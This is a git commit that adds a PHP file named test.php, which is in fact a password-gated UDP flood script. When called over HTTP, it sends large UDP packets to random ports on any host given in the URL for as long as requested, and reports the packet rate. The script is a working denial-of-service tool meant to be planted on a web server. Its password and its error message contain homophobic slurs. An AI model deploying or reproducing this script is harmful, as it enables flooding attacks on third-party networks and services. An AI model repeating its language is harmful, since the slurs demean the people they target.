330ab7d6637d0758e4b4fbb645134c94cde8af80
Zack Evans <31144808+JustZulu@users.noreply.github.com>
2019-08-21 19:27:11 +0100

    Add files via upload

---
+++ test.php
@@ -0,0 +1,33 @@
+<?php
+
+if(isset($_GET['host'])&&isset($_GET['time'])&&$_GET['pass'] == "noncefaggot"){
+    $packets = 0;
+    ignore_user_abort(TRUE);
+    set_time_limit(0);
+    
+    $exec_time = $_GET['time'];
+    
+    $time = time();
+    //print "Started: ".time('d-m-y h:i:s')."<br>";
+    $max_time = $time+$exec_time;
+    $host = $_GET['host'];
+    
+    for($i=0;$i<65000;$i++){
+            $out .= 'X';
+    }
+    while(1){
+    $packets++;
+            if(time() > $max_time){
+                    break;
+            }
+            $rand = rand(1,65000);
+            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
+            if($fp){
+                    fwrite($fp, $out);
+                    fclose($fp);
+            }
+    }
+    echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
+} else {
+    echo 'piss off faggot';
+}
